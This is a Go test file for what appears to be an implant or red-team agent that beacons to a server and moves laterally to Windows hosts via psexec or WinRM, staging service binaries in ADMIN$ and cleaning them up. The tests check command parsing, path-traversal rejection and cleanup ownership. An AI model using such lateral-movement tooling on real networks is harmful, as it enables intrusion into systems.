package main

import (
	"bytes"
	"context"
	"runtime"
	"strings"
	"testing"
)

func TestLateralDeadlinePreservesAcknowledgedCleanup(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	request := lateralPayload{Method: "psexec", Host: "deadline-host", SessionID: "deadline-session", RemoteName: "lab.exe"}
	suffix := strings.Repeat("ef", 16)
	artifact := lateralCleanupPayload{Host: request.Host, ServiceName: "MinimalRmmAgent-" + suffix, BinaryName: "lab-" + suffix + ".exe"}
	defer func() {
		lateralCleanupOwners.Lock()
		delete(lateralCleanupOwners.artifacts, artifact)
		lateralCleanupOwners.Unlock()
	}()
	ack := "lateral started: method=psexec host=" + request.Host + " target session=" + request.SessionID + " service=" + artifact.ServiceName + " binary=" + artifact.BinaryName
	rememberLateralCleanup(request, ack)
	progress := make(chan string, 1)
	progress <- ack
	output, err := awaitLateralResult(ctx, make(chan lateralResult), progress)
	if err != nil || !strings.HasPrefix(output, ack+"\nlateral cleanup pending: ") || !ownsLateralCleanup(artifact) {
		t.Fatalf("deadline lost acknowledged artifacts: %q %v", output, err)
	}
	if _, err := awaitLateralResult(ctx, make(chan lateralResult), make(chan string)); err == nil {
		t.Fatal("deadline before acknowledgment must remain inconclusive")
	}
	results := make(chan lateralResult, 1)
	results <- lateralResult{result: "Lateral failed: stage 2"}
	if output, err := awaitLateralResult(ctx, results, make(chan string)); err != nil || output != "Lateral failed: stage 2" {
		t.Fatalf("completed failure lost to deadline: %q %v", output, err)
	}
}

func TestCleanupRequiresExactAcknowledgedArtifacts(t *testing.T) {
	request := lateralPayload{Method: "psexec", Host: "ownership-test-host", SessionID: "srv-owned-session", RemoteName: "lab-agent.exe"}
	suffix := strings.Repeat("ab", 16)
	artifact := lateralCleanupPayload{Host: request.Host, ServiceName: "MinimalRmmAgent-" + suffix, BinaryName: "lab-agent-" + suffix + ".exe"}
	defer func() {
		lateralCleanupOwners.Lock()
		delete(lateralCleanupOwners.artifacts, artifact)
		lateralCleanupOwners.Unlock()
	}()
	ack := "lateral started: method=psexec host=" + request.Host + " target session=" + request.SessionID + " service=" + artifact.ServiceName + " binary=" + artifact.BinaryName
	for _, invalid := range []string{"Lateral failed: denied", strings.Replace(ack, request.SessionID, "srv-other-session", 1), strings.Replace(ack, artifact.BinaryName, "unrelated.exe", 1), ack + "\nextra"} {
		rememberLateralCleanup(request, invalid)
		if ownsLateralCleanup(artifact) {
			t.Fatal("unacknowledged artifacts acquired cleanup authority")
		}
	}
	rememberLateralCleanup(request, ack)
	if !ownsLateralCleanup(artifact) {
		t.Fatal("acknowledged deployment was not recorded")
	}
	for _, changed := range []lateralCleanupPayload{
		{Host: "other-host", ServiceName: artifact.ServiceName, BinaryName: artifact.BinaryName},
		{Host: artifact.Host, ServiceName: "unrelated", BinaryName: artifact.BinaryName},
		{Host: artifact.Host, ServiceName: artifact.ServiceName, BinaryName: "unrelated.exe"},
	} {
		if ownsLateralCleanup(changed) {
			t.Fatalf("unowned artifact accepted: %+v", changed)
		}
	}
}

func TestParseLateralPayloadRequiresMethodAndHost(t *testing.T) {
	for _, command := range []string{
		`__LATERAL__` + "\n" + `{"method":"smbexec","host":"ws01"}`,
		"__LATERAL__",
		"__LATERAL__\n",
		"__LATERAL__\nnot-json",
		`__LATERAL__` + "\n" + `{"method":"ssh","host":"ws01"}`,
		`__LATERAL__` + "\n" + `{"method":"psexec","host":""}`,
		`__LATERAL__` + "\n" + `{"method":"psexec","host":"ws01","remote_name":"bad name.exe"}`,
		`__LATERAL__` + "\n" + `{"method":"psexec","host":"ws01","remote_name":"..\\evil.exe"}`,
	} {
		if _, err := parseLateralPayload(command); err == nil {
			t.Fatalf("payload %q must be rejected", command)
		}
	}
}

func TestParseLateralPayloadAppliesDefaultsAndBounds(t *testing.T) {
	payload, err := parseLateralPayload(`__LATERAL__` + "\n" + `{"method":" PSEXEC ","host":"\\\\ws01.lab.local","stage":"0123456789abcdef0123456789abcdef"}`)
	if err != nil {
		t.Fatalf("valid payload must parse: %v", err)
	}
	if payload.Method != "psexec" {
		t.Fatalf("method must be lowercased, got %q", payload.Method)
	}
	if payload.Host != "ws01.lab.local" {
		t.Fatalf("host must be trimmed of backslashes, got %q", payload.Host)
	}
	if payload.RemoteName != "minimal-rmm-agent.exe" {
		t.Fatalf("remote_name default missing, got %q", payload.RemoteName)
	}
	if payload.TimeoutSeconds != 300 {
		t.Fatalf("timeout default must be 300, got %g", payload.TimeoutSeconds)
	}
	over, err := parseLateralPayload(`__LATERAL__` + "\n" + `{"method":"winrm","host":"ws01","timeout_seconds":9999}`)
	if err != nil {
		t.Fatalf("bounded timeout must parse: %v", err)
	}
	if over.TimeoutSeconds != 3600 {
		t.Fatalf("timeout must be capped at 3600, got %g", over.TimeoutSeconds)
	}
}

func TestDerivedSessionIDTagsStayTokenSafe(t *testing.T) {
	for _, tag := range []string{"spawn", "lateral"} {
		id := derivedSessionID("go-1730000000000000000", tag)
		if !tokenSafeSessionID.MatchString(id) {
			t.Fatalf("derived %s session ID %q is not beacon token safe", tag, id)
		}
		if !strings.Contains(id, "-"+tag+"-") {
			t.Fatalf("derived session ID %q lost its %s tag", id, tag)
		}
	}
}

func TestLateralCommandRequiresWindowsBuild(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("non-Windows platform guard; Windows execution is covered without remote launches")
	}
	result, err := lateralCommand(`__LATERAL__` + "\n" + `{"method":"winrm","host":"ws01"}`)
	if err == nil {
		t.Fatalf("non-Windows builds must fail, got result %q", result)
	}
	if !strings.Contains(err.Error(), "Windows agent build") {
		t.Fatalf("unexpected lateral error: %v", err)
	}
}

func TestPsexecRequiresStagingReference(t *testing.T) {
	if _, err := lateralCommand(`__LATERAL__` + "\n" + `{"method":"psexec","host":"ws01"}`); err == nil {
		t.Fatal("psexec without a staging reference must fail")
	} else if !strings.Contains(err.Error(), "staging reference") {
		t.Fatalf("unexpected psexec error: %v", err)
	}
	if _, err := parseLateralPayload(`__LATERAL__` + "\n" + `{"method":"psexec","host":"ws01","stage":"short"}`); err == nil {
		t.Fatal("short staging references must be rejected")
	}
}

func TestParseLateralCleanupPayload(t *testing.T) {
	if _, err := parseLateralCleanupPayload("__LATERAL_CLEANUP__"); err == nil {
		t.Fatal("cleanup without a JSON body must be rejected")
	}
	payload, err := parseLateralCleanupPayload(`__LATERAL_CLEANUP__` + "\n" +
		`{"host":"\\\\ws01","service_name":"MinimalRmmAgent-0011223344556677","binary_name":"minimal-rmm-agent-0011223344556677.exe"}`)
	if err != nil {
		t.Fatalf("valid cleanup payload must parse: %v", err)
	}
	if payload.Host != "ws01" || payload.ServiceName == "" || payload.BinaryName == "" {
		t.Fatalf("cleanup payload not parsed: %#v", payload)
	}
	if _, err := parseLateralCleanupPayload(`__LATERAL_CLEANUP__` + "\n" +
		`{"host":"ws01","service_name":"bad service","binary_name":"a.exe"}`); err == nil {
		t.Fatal("invalid service names must be rejected")
	}
}

func TestLateralCleanupCommandRequiresWindowsBuild(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("non-Windows platform guard")
	}
	result, err := lateralCleanupCommand(`__LATERAL_CLEANUP__` + "\n" +
		`{"host":"ws01","service_name":"MinimalRmmAgent-0011223344556677","binary_name":"a.exe"}`)
	if err == nil {
		t.Fatalf("non-Windows builds must fail, got result %q", result)
	}
	if !strings.Contains(err.Error(), "Windows agent build") {
		t.Fatalf("unexpected cleanup error: %v", err)
	}
}

func TestEmbeddedLateralServicePlaceholderIsDetected(t *testing.T) {
	if bytes.HasPrefix(embeddedLateralService, []byte("MZ")) && len(embeddedLateralService) < 1024 {
		t.Fatalf("unexpectedly small embedded lateral service binary: %d bytes", len(embeddedLateralService))
	}
}

func TestExecuteDispatchesLateralAndUid(t *testing.T) {
	cfg := &config{BaseURL: "http://127.0.0.1:8787", BeaconSecret: "s", SessionID: "go-test"}
	// Invalid input exercises dispatch on Windows without launching a worker.
	output, resultType := execute(`__LATERAL__`+"\n"+`{"method":"psexec","host":""}`, cfg, nil)
	if resultType != "output" || !strings.HasPrefix(output, "Lateral failed: ") {
		t.Fatalf("unexpected lateral dispatch: %q / %q", output, resultType)
	}
	output, resultType = execute("__UID__", cfg, nil)
	if resultType != "output" {
		t.Fatalf("uid must return output, got %q", resultType)
	}
	if !strings.HasPrefix(output, "agent user: ") {
		t.Fatalf("uid output must start with the agent user, got %q", output)
	}
	if !strings.Contains(output, "network identity: none") {
		t.Fatalf("uid without make_token must report no network identity, got %q", output)
	}
}

func TestUidActionContract(t *testing.T) {
	output, err := uidAction()
	if err != nil {
		t.Fatalf("uidAction failed: %v", err)
	}
	lines := strings.Split(output, "\n")
	if len(lines) != 2 || !strings.HasPrefix(lines[0], "agent user: ") || !strings.HasPrefix(lines[1], "network identity: ") {
		t.Fatalf("uid output must be a stable two-line contract, got %q", output)
	}
}

func TestCleanupOwnershipRetainedOnlyWhenImmediateCleanupIsPending(t *testing.T) {
	request := lateralPayload{Method: "psexec", Host: "pending-cleanup-host", SessionID: "pending-session-123", RemoteName: "lab.exe"}
	suffix := strings.Repeat("cd", 16)
	artifact := lateralCleanupPayload{Host: request.Host, ServiceName: "MinimalRmmAgent-" + suffix, BinaryName: "lab-" + suffix + ".exe"}
	clear := func() {
		lateralCleanupOwners.Lock()
		delete(lateralCleanupOwners.artifacts, artifact)
		lateralCleanupOwners.Unlock()
	}
	defer clear()
	ack := "lateral started: method=psexec host=" + request.Host + " target session=" + request.SessionID + " service=" + artifact.ServiceName + " binary=" + artifact.BinaryName
	rememberLateralCleanup(request, ack+"\nlateral cleanup: service deleted; launcher binary removed from ADMIN$")
	if ownsLateralCleanup(artifact) {
		t.Fatal("completed cleanup retained deletion authority")
	}
	rememberLateralCleanup(request, ack+"\nlateral cleanup pending: file busy")
	if !ownsLateralCleanup(artifact) {
		t.Fatal("pending cleanup lost exact-artifact retry authority")
	}
}
